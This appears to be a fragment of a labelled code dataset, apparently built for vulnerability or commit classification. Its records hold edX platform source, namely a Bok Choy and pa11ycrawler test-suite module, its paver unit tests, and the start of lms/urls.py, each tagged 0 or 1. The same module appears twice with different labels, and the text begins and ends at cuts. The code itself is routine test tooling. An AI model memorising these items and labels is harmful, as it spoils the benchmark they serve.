\"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n/n/n/n", "label": 0}, {"id": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "code": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n/n/n/n/pavelib/utils/test/suites/bokchoy_suite.py/n/n\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n/n/n/n", "label": 1}, {"id": "4e4c209ae3deb4c78bcec89c181516af8604b450", "code": "lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 